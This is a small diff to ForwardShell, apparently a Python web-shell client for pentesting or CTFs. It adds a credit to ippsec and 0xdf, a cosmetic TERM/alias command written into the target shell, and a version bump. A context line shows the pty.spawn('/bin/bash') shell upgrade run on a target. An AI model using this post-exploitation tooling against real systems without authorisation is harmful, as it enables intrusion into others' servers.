@@ -9,6 +9,7 @@
 # - File download
 #
 # Author: 61106960
+# Credits to ippsec and 0xdf for their initial idea of a shell like this
 
 import base64
 import random
@@ -248,6 +249,10 @@ class WebShell(object):
             print(f'[*] Start PTY with {self.PYTHON}')
             UpgradeShell = f"""{self.PYTHON} -c 'import pty; pty.spawn("/bin/bash")'"""
             self.WriteCmd(UpgradeShell)
+            print(f'Just pimp your PTY a little bit...')
+            pimp_shell = f"""export TERM=xterm ; alias ll=\'ls -ali --color=auto\'"""
+            self.WriteCmd(pimp_shell)
+
         else:
             print(f"[ERROR] No Python found on target; PTY not possible")
 
@@ -665,7 +670,7 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.2.3'
+    __version__ = '0.2.4'
 
     parser = argparse.ArgumentParser(
         add_help = True,
